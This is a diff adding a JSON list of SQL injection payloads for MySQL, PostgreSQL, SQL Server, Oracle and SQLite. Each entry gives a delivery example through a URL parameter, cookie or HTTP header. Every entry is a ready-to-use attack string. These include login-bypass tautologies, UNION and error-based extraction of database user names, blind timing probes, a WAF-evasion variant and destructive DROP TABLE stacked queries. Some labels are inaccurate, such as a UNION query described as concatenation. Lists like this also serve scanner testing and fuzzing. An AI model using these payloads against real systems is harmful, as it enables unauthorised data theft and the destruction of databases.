@@ -1,0 +1,131 @@
+{
+  "_comment": "SQL Injection Payloads for different attack vectors.",
+  "payloads": [
+    {
+      "_comment": "Basic SQL Injection payloads",
+      "type": "basic",
+      "description": "Simple single quote injection.",
+      "payload": "' OR '1'='1",
+      "database": "all",
+      "vector": "GET/POST Parameter",
+      "example": "https://example.com/search?q=' OR '1'='1"
+    },
+    {
+      "_comment": "Numeric context bypass",
+      "type": "numeric",
+      "description": "Bypass numeric context with string injection.",
+      "payload": "1 OR 1=1",
+      "database": "all",
+      "vector": "GET/POST Parameter",
+      "example": "https://example.com/item?id=1 OR 1=1"
+    },
+    {
+      "_comment": "String concatenation for MySQL",
+      "type": "string_concat",
+      "description": "String concatenation in MySQL.",
+      "payload": "\" UNION SELECT user(), database() -- -",
+      "database": "mysql",
+      "vector": "GET/POST Parameter",
+      "example": "https://example.com/search?q=\" UNION SELECT user(), database() -- -"
+    },
+    {
+      "_comment": "String concatenation for PostgreSQL",
+      "type": "string_concat",
+      "description": "String concatenation in PostgreSQL.",
+      "payload": "' || (SELECT user) || '",
+      "database": "postgresql",
+      "vector": "GET/POST Parameter",
+      "example": "https://example.com/search?q=' || (SELECT user) || '"
+    },
+    {
+      "_comment": "String concatenation for SQL Server",
+      "type": "string_concat",
+      "description": "String concatenation in SQL Server.",
+      "payload": "'+(SELECT user)+'",
+      "database": "sqlserver",
+      "vector": "GET/POST Parameter",
+      "example": "https://example.com/search?q='+(SELECT user)+'"
+    },
+    {
+      "_comment": "String concatenation for Oracle",
+      "type": "string_concat",
+      "description": "String concatenation in Oracle.",
+      "payload": "'||(SELECT user FROM dual)||'",
+      "database": "oracle",
+      "vector": "GET/POST Parameter",
+      "example": "https://example.com/search?q='||(SELECT user FROM dual)||'"
+    },
+    {
+      "_comment": "Error-based SQL injection (MySQL)",
+      "type": "error_based",
+      "description": "Error-based SQL injection using `extractvalue()` in MySQL.",
+      "payload": "' AND extractvalue(rand(),concat(0x3a,(select user()))) #",
+      "database": "mysql",
+      "vector": "GET/POST Parameter",
+      "example": "https://example.com/search?q=' AND extractvalue(rand(),concat(0x3a,(select user()))) #"
+    },
+    {
+      "_comment": "Time-based blind SQL injection (MySQL)",
+      "type": "time_based",
+      "description": "Time-based blind SQL injection using `sleep()` in MySQL.",
+      "payload": "' AND IF(substring(user(),1,1)='r',sleep(5),1) #",
+      "database": "mysql",
+      "vector": "GET/POST Parameter",
+      "example": "https://example.com/search?q=' AND IF(substring(user(),1,1)='r',sleep(5),1) #"
+    },
+    {
+      "_comment": "Boolean-based blind SQL injection (MySQL)",
+      "type": "boolean_based",
+      "description": "Boolean-based blind SQL injection (MySQL).",
+      "payload": "' AND 1=1 #",
+      "database": "mysql",
+      "vector": "GET/POST Parameter",
+      "example": "https://example.com/search?q=' AND 1=1 #"
+    },
+    {
+      "_comment": "Stacked queries (MySQL)",
+      "type": "stacked_queries",
+      "description": "Stacked queries injection in MySQL.",
+      "payload": "'; DROP TABLE users;--",
+      "database": "mysql",
+      "vector": "GET/POST Parameter",
+      "example": "https://example.com/search?q='; DROP TABLE users;--"
+    },
+    {
+      "_comment": "Bypass WAF with obfuscation",
+      "type": "waf_bypass",
+      "description": "Bypassing WAF with case randomization.",
+      "payload": "' UnIoN SeLeCt 1,2,3 -- -",
+      "database": "all",
+      "vector": "GET/POST Parameter",
+      "example": "https://example.com/search?q=' UnIoN SeLeCt 1,2,3 -- -"
+    },
+    {
+      "_comment": "Cookie-based injection",
+      "type": "cookie",
+      "description": "SQL injection in cookie value.",
+      "payload": "' OR '1'='1",
+      "database": "all",
+      "vector": "Cookie",
+      "example": "Set-Cookie: sessionid=' OR '1'='1"
+    },
+    {
+      "_comment": "Header-based injection",
+      "type": "header",
+      "description": "SQL injection in HTTP Header value.",
+      "payload": "' OR '1'='1",
+      "database": "all",
+      "vector": "HTTP Header",
+      "example": "X-Forwarded-For: ' OR '1'='1"
+    },
+    {
+      "_comment": "SQLite injection",
+      "type": "basic",
+      "description": "Basic SQLite injection.",
+      "payload": "'); DROP TABLE users; --",
+      "database": "sqlite",
+      "vector": "GET/POST Parameter",
+      "example": "https://example.com/search?q='); DROP TABLE users; --"
+    }
+  ]
+}
